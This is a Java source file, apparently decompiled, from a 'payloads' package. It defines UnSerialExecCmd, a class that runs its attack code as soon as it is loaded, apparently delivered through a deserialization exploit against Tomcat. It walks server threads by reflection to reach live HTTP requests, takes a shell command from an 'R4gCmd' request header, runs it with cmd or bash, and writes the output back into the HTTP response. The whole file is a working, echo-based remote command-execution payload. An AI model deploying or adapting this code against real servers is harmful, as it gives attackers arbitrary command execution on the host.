package payloads;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.List;

public class UnSerialExecCmd {

    public static final String CMD_HEADER = "R4gCmd";

    public UnSerialExecCmd() {
    }

    private static void init() {
        ThreadGroup var0 = Thread.currentThread().getThreadGroup();
        ClassLoader var1 = Thread.currentThread().getContextClassLoader();
        Thread[] var2 = (Thread[])getField(var0, "threads");
        if (var2 != null) {
            Thread[] var3 = var2;
            int var4 = var2.length;

            for(int var5 = 0; var5 < var4; ++var5) {
                Thread var6 = var3[var5];
                if (var6 != null) {
                    try {
                        String var7 = var6.getName();
                        if (!var7.contains("exec") && var7.contains("http")) {
                            Object var8 = getField(var6, "target");
                            if (var8 instanceof Runnable) {
                                Object var9 = getField(var8, "this$0");
                                if (var9 != null) {
                                    Object var10 = getField(var9, "handler");
                                    if (var10 != null) {
                                        Object var11 = getField(var10, "global");
                                        if (var11 != null) {
                                            List var12 = (List)getField(var11, "processors");
                                            if (var12 != null) {
                                                for(int var13 = 0; var13 < var12.size(); ++var13) {
                                                    Object var14 = var12.get(var13);
                                                    Field var15 = var14.getClass().getDeclaredField("req");
                                                    var15.setAccessible(true);
                                                    Object var16 = var15.get(var14);
                                                    Object var17 = var16.getClass().getMethod("getResponse").invoke(var16);
                                                    String var18 = (String)var16.getClass().getMethod("getHeader", String.class).invoke(var16, CMD_HEADER);
                                                    if (var18 != null && !var18.isEmpty()) {
                                                        Class var19 = var17.getClass();
                                                        var19.getMethod("setStatus", Integer.TYPE).invoke(var17, 200);
                                                        ByteArrayOutputStream var20 = execCmd(var18);
                                                        byte[] var21 = var20.toByteArray();

                                                        try {
                                                            Class var22 = Class.forName("org.apache.tomcat.util.buf.ByteChunk", false, var1);
                                                            Object var23 = var22.newInstance();
                                                            Method var24 = var22.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE);
                                                            var24.invoke(var23, var21, 0, var21.length);
                                                            var19.getMethod("doWrite", var22).invoke(var17, var23);
                                                        } catch (NoSuchMethodException var25) {
                                                            var19.getMethod("doWrite", ByteBuffer.class).invoke(var17, ByteBuffer.wrap(var21));
                                                        }

                                                        return;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } catch (Exception var26) {
                    }
                }
            }
        }

    }

    private static Object getField(Object var0, String var1) {
        Field var2 = makeAccess(var0, var1);
        if (var2 == null) {
            return null;
        } else {
            try {
                return var2.get(var0);
            } catch (Exception var4) {
                return null;
            }
        }
    }

    private static Field makeAccess(Object var0, String var1) {
        Class var2 = var0.getClass();

        while(var2 != Object.class) {
            try {
                Field var3 = var2.getDeclaredField(var1);
                var3.setAccessible(true);
                return var3;
            } catch (NoSuchFieldException var4) {
                var2 = var2.getSuperclass();
            }
        }

        return null;
    }

    public static ByteArrayOutputStream execCmd(String var0) {
        if (var0 == null) {
            return null;
        } else {
            try {
                if (var0.isEmpty()) {
                    return null;
                } else {
                    InputStream var1 = Runtime.getRuntime().exec(System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd", "/c", var0} : new String[]{"/bin/bash", "-c", var0}).getInputStream();
                    ByteArrayOutputStream var2 = new ByteArrayOutputStream();
                    byte[] var3 = new byte[1024];

                    while(true) {
                        int var4 = var1.read(var3);
                        if (var4 == -1) {
                            return var2;
                        }

                        var2.write(var3, 0, var4);
                    }
                }
            } catch (Exception var5) {
                return null;
            }
        }
    }

    static {
        init();
    }
}
